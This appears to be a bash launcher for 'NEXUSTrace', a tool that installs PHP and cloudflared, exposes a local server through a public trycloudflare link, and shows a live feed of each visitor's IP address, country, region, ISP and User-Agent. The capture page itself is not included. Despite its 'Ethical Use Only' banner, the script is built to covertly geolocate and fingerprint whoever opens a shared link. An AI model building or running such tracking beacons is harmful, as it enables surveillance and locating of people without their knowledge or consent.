#!/bin/bash
# ==============================
# NEXUSTrace — Live Monitor
# Ethical Use Only · Termux + Linux
# ==============================

# ——— Detect Termux ———
if [ -n "$ANDROID_ROOT" ] || [ -d "/system/bin" ]; then
  IS_TERMUX=1
fi

# ——— Color Setup (Safe for Termux) ———
if [ "$IS_TERMUX" = "1" ] && ! command -v tput >/dev/null 2>&1; then
  # Fallback to ANSI if tput missing
  GREEN="\e[32m"
  RED="\e[31m"
  CYAN="\e[36m"
  YELLOW="\e[33m"
  BLUE="\e[34m"
  MAGENTA="\e[35m"
  RESET="\e[0m"
  BOLD="\e[1m"
else
  # Use tput if available
  GREEN=$(tput setaf 2)
  RED=$(tput setaf 1)
  CYAN=$(tput setaf 6)
  YELLOW=$(tput setaf 3)
  BLUE=$(tput setaf 4)
  MAGENTA=$(tput setaf 5)
  RESET=$(tput sgr0)
  BOLD=$(tput bold)
fi

clear

# ——— Banner ———
echo -e "${CYAN}${BOLD}"
cat << "EOF"
███╗   ██╗   ████████╗██████╗  █████╗  ██████╗███████╗
████╗  ██║   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██╔██╗ ██║█████╗██║   ██████╔╝███████║██║     █████╗
██║╚██╗██║╚════╝██║   ██╔══██╗██╔══██║██║     ██╔══╝
██║ ╚████║      ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚═╝  ╚═══╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
EOF
echo -e "${RESET}"
echo -e "${YELLOW}${BOLD}N E X U S T R A C E${RESET}"
echo -e "${GREEN}Global Geolocation Beacon · Ethical Only${RESET}"
echo -e "${GREEN}by CHRIZ · SKY TECH&CRAFTS${RESET}"

# ——— Install PHP if missing (Termux only) ———
if ! command -v php >/dev/null 2>&1; then
  if [ "$IS_TERMUX" = "1" ]; then
    echo -e "${YELLOW}[*] Installing PHP via pkg...${RESET}"
    pkg install php -y || { echo -e "${RED}[!] Failed to install PHP.${RESET}"; exit 1; }
  else
    echo -e "${RED}[!] PHP not found. Install with: sudo apt install php-cli${RESET}"
    exit 1
  fi
fi

# ——— Architecture Detection ———
if [ "$IS_TERMUX" = "1" ]; then
  ARCH=$(getprop ro.product.cpu.abi)
  case "$ARCH" in
    arm64-v8a|arm64) CF_ARCH="arm64" ;;
    armeabi-v7a|armeabi) CF_ARCH="arm" ;;
    x86_64) CF_ARCH="amd64" ;;
    x86) CF_ARCH="386" ;;
    *) echo -e "${RED}[!] Unsupported Android ABI: $ARCH${RESET}"; exit 1 ;;
  esac
  CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-android-$CF_ARCH"
else
  ARCH=$(uname -m)
  case "$ARCH" in
    x86_64)   CF_ARCH="amd64" ;;
    aarch64|arm64) CF_ARCH="arm64" ;;
    i386|i686) CF_ARCH="386" ;;
    *) echo -e "${RED}[!] Unsupported architecture: $ARCH${RESET}"; exit 1 ;;
  esac
  CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$CF_ARCH"
fi

CLOUDFLARED="./cloudflared"
TUNNEL_LOG="tunnel_silent.log"
CAPTURE_LOG="capture/nexustrace.log"

# ——— Download Cloudflared ———
if [ ! -f "$CLOUDFLARED" ]; then
  echo -e "${CYAN}[*] Downloading Cloudflared ($CF_ARCH)...${RESET}"
  curl -sL "$CF_URL" -o "$CLOUDFLARED"
  chmod +x "$CLOUDFLARED"
fi

# ——— Start PHP Server ———
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 1
echo -e "${GREEN}[✓] PHP Server Running${RESET}"

# ——— Start Tunnel ———
nohup "$CLOUDFLARED" tunnel --url http://127.0.0.1:8080 --no-autoupdate --protocol http2 > "$TUNNEL_LOG" 2>&1 &
sleep 6
echo -e "${GREEN}[✓] Tunnel Started${RESET}"

# ——— Get Public URL ———
PUBLIC_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare.com' "$TUNNEL_LOG" | head -n1)
if [ -n "$PUBLIC_URL" ]; then
  echo -e "${CYAN}${BOLD}[*] Public URL:${RESET} ${GREEN}$PUBLIC_URL${RESET}"
else
  echo -e "${RED}[!] Tunnel running, URL not captured yet${RESET}"
fi

# ——— Prepare Capture Dir ———
mkdir -p capture
touch "$CAPTURE_LOG"

echo -e "\n${BLUE}${BOLD}📡 LIVE CAPTURE MONITOR${RESET}"
echo -e "${BLUE}════════════════════════════════════════${RESET}"

# ——— Cleanup Function ———
cleanup() {
  echo -e "\n${RED}${BOLD}Stopping NEXUSTrace...${RESET}"
  kill "$PHP_PID" 2>/dev/null
  pkill -f cloudflared 2>/dev/null
  sleep 1
  echo -e "${GREEN}[✓] All processes terminated${RESET}"
  exit 0
}
trap cleanup INT TERM

# ——— Live Feed ———
tail -n 0 -f "$CAPTURE_LOG" | while read -r line; do
  case "$line" in
    *"IP:"*)
      echo -e "\n${MAGENTA}${BOLD}━━━━━━━━━━ New Visitor ━━━━━━━━━━${RESET}"
      echo -e "${CYAN}🕒 Time:${RESET} ${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${RESET}"
      echo -e "${GREEN}🌐 IP:${RESET} ${BOLD}${line#*IP: }${RESET}"
      ;;
    *"Country:"*)
      echo -e "${BLUE}📍 Country:${RESET} ${line#*Country: }"
      ;;
    *"Region:"*)
      echo -e "${BLUE}🏙 Region:${RESET} ${line#*Region: }"
      ;;
    *"ISP:"*)
      echo -e "${CYAN}🏢 ISP:${RESET} ${line#*ISP: }"
      ;;
    *"User-Agent:"*)
      echo -e "${YELLOW}🖥 User-Agent:${RESET} ${line#*User-Agent: }"
      echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
      ;;
  esac
done
